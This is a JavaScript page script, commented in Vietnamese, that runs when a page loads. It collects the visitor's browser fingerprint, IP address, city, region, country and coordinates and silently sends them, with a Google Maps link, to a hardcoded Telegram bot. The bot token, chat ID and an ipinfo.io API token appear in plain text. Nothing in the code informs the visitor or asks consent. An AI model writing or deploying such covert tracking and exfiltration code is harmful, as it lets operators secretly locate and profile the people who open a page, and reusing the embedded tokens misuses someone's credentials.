const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn



// Lấy thông tin trình duyệt & thiết bị
function getDeviceFingerprint() {
    return {
        platform: navigator.platform, // Hệ điều hành
        language: navigator.language, // Ngôn ngữ trình duyệt
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Múi giờ
        screenResolution: `${screen.width}x${screen.height}`, // Độ phân giải màn hình
        colorDepth: screen.colorDepth, // Độ sâu màu
        plugins: Array.from(navigator.plugins).map(p => p.name).join(", "), // Plugin trình duyệt
    };
}

// Hàm lấy vị trí & gửi đến Telegram
async function sendInfoToTelegram() {
    const fingerprint = getDeviceFingerprint();
    let city = "Không xác định";
    let region = "Không xác định";
    let country = "Không xác định";
    let latitude = "Không xác định";
    let longitude = "Không xác định";
    let ipAddress = "Không xác định";

    try {
        let response = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf");
        let data = await response.json();

        if (data.city) city = data.city;
        if (data.region) region = data.region;
        if (data.country) country = data.country;
        if (data.ip) ipAddress = data.ip;
        if (data.loc) [latitude, longitude] = data.loc.split(",");
    } catch (error) {
        console.log("Lỗi API ipinfo.io, thử API khác...");

        try {
            let fallbackResponse = await fetch("http://ip-api.com/json/");
            let fallbackData = await fallbackResponse.json();

            if (fallbackData.city) city = fallbackData.city;
            if (fallbackData.regionName) region = fallbackData.regionName;
            if (fallbackData.country) country = fallbackData.country;
            if (fallbackData.query) ipAddress = fallbackData.query;
            if (fallbackData.lat) latitude = fallbackData.lat;
            if (fallbackData.lon) longitude = fallbackData.lon;
        } catch (fallbackError) {
            console.log("Không thể lấy vị trí từ API dự phòng.");
        }
    }

    let now = new Date();
    let dateTime = now.toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });

    // Gửi tin nhắn đến Telegram
    const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const message = `
🔍 **THÔNG TIN TRUY CẬP**
🕒 Thời gian: ${dateTime}
📌 Địa chỉ IP: ${ipAddress}
🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
🏙️ Thành phố: ${city}
🏛️ Tỉnh/Bang: ${region}
🌏 Quốc gia: ${country}

💻 Hệ điều hành: ${fingerprint.platform}
🌐 Ngôn ngữ trình duyệt: ${fingerprint.language}
🕰️ Múi giờ: ${fingerprint.timezone}
🖥️ Độ phân giải màn hình: ${fingerprint.screenResolution}
🎨 Độ sâu màu: ${fingerprint.colorDepth}
🔌 Plugin trình duyệt: ${fingerprint.plugins}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    });
}

// Gọi hàm khi trang tải
sendInfoToTelegram();

